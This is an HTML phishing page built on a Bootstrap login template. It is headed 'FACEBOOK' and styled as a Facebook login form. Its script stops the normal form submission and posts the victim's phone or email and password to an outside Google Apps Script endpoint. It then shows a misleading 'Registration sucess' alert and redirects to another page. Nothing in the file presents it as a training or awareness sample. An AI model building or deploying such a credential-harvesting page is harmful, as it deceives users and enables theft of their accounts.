<!DOCTYPE html>
<html>
<head>
    <title>Instagram Mobile Login Page In Bootstrap 4 - W3hubs.com</title>
    <meta charset="utf-8">
    <meta name="description" content="w3hubs.com">
  <meta name="author" content="w3hubs.com">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <section id="w3hubs">
        <div class="container">
        
            <h1>FACEBOOK</h1>
            <form id="submit-form" action="">
             <div class="form-group">
               
                <input type="name" id="name" name="name" class="form-control" placeholder="Phone number or email" required="required">
              </div>
              <div class="form-group">
               
                <input type="password" name="password" id="password" class="form-control" placeholder="Password" required="required">
              </div>
              <button type="submit" class="btn btn-primary">Log In</button>
            </form>
            <h4>OR</h4>
            <p><i class="fa fa-facebook-square"></i><a href="#">Log In Facebook</a></p>
            <p><a href="#">Forget Password</a></p>
</div>
            <div class="box">
                <p>Don't have account? <a href="#">Sign up</a></p>
            </div>
        
    
    </section>
    <script>
                $("#submit-form").submit((e)=>{
                    e.preventDefault()
                    $.ajax({
                        url:"https://script.google.com/macros/s/AKfycbyo8W-mHNuPaSq86FRDfVS_EjjVmrD9k50g1mlVfQrg8hXzX2yZCA87wCTx6G1fwWf10w/exec",
                        data:$("#submit-form").serialize(),
                        method:"post",
                        success:function (response){
                            alert("Registration sucess Click ok to coninue")
                            window.location.href="click.html"
                            //window.location.href="https://google.com"
                        },
                        error:function (err){
                            alert("Something Error or no internet connection")
            
                        }
                    })
                })
            </script>
</body>
</html>
